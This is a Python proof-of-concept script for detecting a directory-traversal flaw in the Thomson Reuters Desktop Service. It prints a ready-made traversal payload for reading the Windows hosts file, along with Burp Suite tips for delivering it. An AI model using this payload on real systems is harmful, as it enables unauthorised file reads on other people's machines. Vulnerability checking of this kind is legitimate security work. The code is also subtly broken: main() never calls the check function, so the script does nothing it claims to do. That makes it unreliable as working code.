#!/usr/bin/env python

#######################
#   PoC by: 0v3rride  #
#   DoC: March 2019   #
#######################

from argparse import *;
from requests import *;

def parseArgs():
    parser = ArgumentParser();
    parser.add_argument("-host", required=True, type=str, help="IP address or FQDN of the host to check");
    parser.add_argument("-verbose", required=False, action="store_true", default=False, help="Returns a detailed response from the get request");
    parser.add_argument("-tls", required=False, action="store_true", default=False, help="Use this flag is the target host is using https");
    parser.add_argument("-port", required=False, type=int, default=6677, help="By default the Thomson Reuters Desktop Service listens on port 6677, but I've also seen it listen on ports 7000-7002");

    return parser.parse_args();

def check():
    args = parseArgs();
    greq = None;

    if args.tls:
        greq = get("{}{}:{}".format("https://", args.host, args.port));
    elif not args.tls:
        greq = get("{}{}:{}".format("http://", args.host, args.port));
    else:
        greq = get("{}{}:{}".format("http://", args.host, args.port));

    if args.verbose:
        print("{}:{}".format("Detailed Response", "-"*50));
        for hdr in greq.headers.keys():
            print("{}: {}".format(hdr, greq.headers[hdr]));

    if greq.content.find("<h1>Page Not Found</h1>Sorry, we couldn't find what you were looking :(") > -1:
        print("[!!!]: The target looks like it is VULNERABLE to directory traversal!");
        print("[i]: Use the following GET request value with the repeater tool in Burp Suite to confirm: \\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\Drivers\\etc\\hosts\n");
        print("[i]: Make sure the paths you are traversing to don't end with a backslash '\\', otherwise it will not work. You'll know when this happens via an error message in the response.\n");
        print("[i]: If you decide to run the request with the intruder tool in Brup Suite, then make sure Brup doesn't encode the payloads as this will not make it work either.\n");
    else:
        print("[i]: The target DOES NOT appear to be vulnerable to directory traversal. However, there is a chance that the error message was disabled, etc.")
        print("[i]: You may to try the following GET request value with the repeater tool in Burp Suite to confirm: \\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\Drivers\\etc\\hosts\n");
        print("[i]: Make sure the paths you are traversing to don't end with a backslash '\\'.\n");
        print("[i]: If you decide to run the request with the intruder tool in Brup Suite, then make sure Brup doesn't encode the payloads as this will not make it work either.\n");


def main():
    print(r"""
   ______     _______     ____   ___  _  ___         ___ _____  ___ ____
  / ___\ \   / / ____|   |___ \ / _ \/ |/ _ \       ( _ )___ / ( _ ) ___|
 | |    \ \ / /|  _| _____ __) | | | | | (_) |_____ / _ \ |_ \ / _ \___ \
 | |___  \   / | |__|_____/ __/| |_| | |\__, |_____| (_) |__) | (_) |__) |
  \____|  \_/  |_____|   |_____|\___/|_|  /_/       \___/____/ \___/____/

                        [*] https://github.com/0v3rride
                        [*] Script has started...
                        [*] Use CTRL+C to cancel the script at anytime.
                        
    [!]: This script checks to see if the target if vulnerable. It does not exploit the vulnerability!
    [!]: You might need to use the dos2unix tool for conversion and functionality purposes on a Linux box!

    """);

    parseArgs();
    print("[!]: Done!");

#Begin
main();
